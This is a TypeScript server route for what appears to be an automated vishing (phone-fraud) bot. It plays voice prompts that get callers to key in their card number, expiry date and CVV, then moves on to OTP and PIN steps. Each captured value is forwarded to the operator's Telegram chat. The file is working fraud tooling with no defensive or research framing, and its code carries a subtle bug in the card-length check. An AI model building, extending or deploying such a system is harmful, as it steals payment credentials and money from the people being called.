import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';
import { getLangStep } from '../../languages';
import { Language } from '../../types';

app.all('/calls/:step/:chatId/:language', async (req, res) => {
  const { cardType, isAccount, expiry, cvv, variables } = req.query;
  const { language, chatId, step } = req.params;

  const { dtmf } = JSON.parse(variables as string);

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call STEP STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangStep({
              step: isAccount === 'yes' ? '1' : cvv === 'yes' ? '2' : '3',
              cardType: cardType !== 'undefined' ? String(cardType) : ``,
              dtmf,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
          },
        },
      ],
    });
  }

  if (isAccount === 'yes') {
    if (!(dtmf.lengt > 15 && dtmf.length < 16)) {
      return res.json({
        id: uuidv4(),
        title: `call STEP STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangStep({
                step: `4`,
                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                dtmf,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    return res.json({
      id: uuidv4(),
      title: `call STEP STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangStep({
              step: `5`,
              cardType: cardType !== 'undefined' ? String(cardType) : ``,
              dtmf,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
          },
        },
      ],
    });
  }

  if (expiry === 'yes') {
    if (!/^[0-9]{4,6}$/.test(dtmf)) {
      return res.json({
        id: uuidv4(),
        title: `call STEP STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangStep({
                step: `6`,
                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                dtmf,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 18,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(
        chatId,
        `Expiration date <b>${dtmf}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    return res.json({
      id: uuidv4(),
      title: `call STEP STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangStep({
              step: `7`,
              cardType: cardType !== 'undefined' ? String(cardType) : ``,
              dtmf,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
          },
        },
      ],
    });
  }

  if (cvv === 'yes') {
    if (!/^[0-9]{3,4}$/.test(dtmf)) {
      return res.json({
        id: uuidv4(),
        title: `call STEP STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangStep({
                step: `8`,
                cardType: cardType !== 'undefined' ? String(cardType) : ``,
                dtmf,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
            },
          },
        ],
      });
    }
    if (dtmf) {
      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
        parse_mode: 'HTML',
      });
    }
    return res.json({
      id: uuidv4(),
      title: `call STEP STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangStep({
              step: `9`,
              cardType: cardType !== 'undefined' ? String(cardType) : ``,
              dtmf,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }
});
